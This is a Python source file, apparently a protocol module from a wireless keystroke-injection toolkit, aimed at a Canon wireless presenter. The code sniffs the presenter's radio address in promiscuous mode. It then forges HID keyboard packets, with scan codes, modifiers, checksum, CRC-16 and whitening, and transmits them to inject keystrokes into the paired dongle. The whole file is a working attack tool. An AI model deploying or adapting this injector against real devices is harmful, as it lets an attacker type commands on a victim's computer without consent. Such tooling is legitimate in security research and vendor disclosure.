from protocol import Protocol
from lib import common
from threading import Thread
from collections import deque
import time
import logging
import crcmod
import struct


# Canon wireless presenter
class Canon(Protocol):

  # Constructor
  def __init__(self):
    super(Canon, self).__init__("Canon")

    self.CRC16 = crcmod.mkCrcFun(0x11021, initCrc=0x0000, rev=True, xorOut=0x0000)
  
    self.LUT = [0]*256
    lut = [0x0, 0x8, 0x4, 0xC, 0x2, 0xA, 0x6, 0xE, 0x1, 0x9, 0x5, 0xD, 0x3, 0xB, 0x7, 0xF]
    for x in range(256):
      b = lut.index(x>>4) | (lut.index(x&0xf)<< 4)
      self.LUT[x] = b
      print(x, b)

    self.seq = 0


  # Configure the radio
  def configure_radio(self):

    # Put the radio in promiscuous mode
    common.radio.enter_promiscuous_mode_generic("\xAC\xC5\x05", common.RF_RATE_1M, payload_length=32)

    # Set the channels to {6..81..5}
    common.channels = range(6, 81, 5)

    # Set the initial channel
    common.radio.set_channel(common.channels[0])


  # Build a packet
  def build_packet(self, scan_code=0, shift=False, ctrl=False, win=False):

    # Build the HID payload
    pld = ("09:22:00:%02x:00:00:00:%02x:00:00:00:00"%(scan_code, self.seq&0xff)).replace(":", "").decode("hex")
    self.seq += 1

    # Add the modifier flags
    modifiers = 0x00
    if shift: modifiers |= 0x20
    if ctrl: modifiers |= 0x01
    if win: modifiers |= 0x08
    idx = 2
    pld = pld[0:idx] + chr(modifiers) + pld[idx+1:]    

    # Update the 1-byte checksum
    pld = pld[0:9] + chr(sum([ord(p) for p in pld[0:9]])&0xFF) + pld[10:]

    # Update the CRC-16
    pld = pld[:10] + struct.pack("H", self.CRC16(pld[0:10]))

    # Whiten the payload
    pld = [self.LUT.index(ord(c)) for c in pld]

    return pld


  # Enter injection mode
  def start_injection(self):

    # Build a dummy HID payload
    self.seq = 0
    pld = "09:22:00:00:00:00:00:00:00:00:00:00".replace(":", "").decode("hex")
    pld = pld[0:9] + chr(sum([ord(p) for p in pld[0:9]])&0xFF) + pld[10:]
    pld = pld[:10] + struct.pack("H", self.CRC16(pld[0:10]))
    pld = [self.LUT.index(ord(c)) for c in pld]
    self.dummy_pld = pld
    self.seq += 1

    # Start the TX loop
    self.cancel_tx_loop = False
    self.tx_queue = deque()
    self.tx_thread = Thread(target=self.tx_loop)
    self.tx_thread.daemon = True
    self.tx_thread.start()

    # Queue up 50 dummy packets for initial dongle sync
    for x in range(50):
      self.tx_queue.append(self.dummy_pld)


  # TX loop
  def tx_loop(self):

    while not self.cancel_tx_loop:

      # Read from the queue
      if len(self.tx_queue):

        # Transmit the queued packet a bunch of times
        payload = self.tx_queue.popleft()
        for x in range(25):
          common.radio.transmit_payload_generic(address="\xAA\xAA\xAA",
            payload="\xAC\xC5\x05"+''.join(chr(c) for c in payload)+"\xff\xff")
      
      # No queue items; transmit a dummy packet
      else:
        self.tx_queue.append(self.build_packet(0, False, False, False))


  # Leave injection mode
  def stop_injection(self):
    while len(self.tx_queue):
      time.sleep(0.001)
      continue
    self.cancel_tx_loop = True
    self.tx_thread.join()


  # Send a HID event
  def send_hid_event(self, scan_code=0, shift=False, ctrl=False, win=False):

    # Build and queue
    self.tx_queue.append(self.build_packet(scan_code, shift, ctrl, win))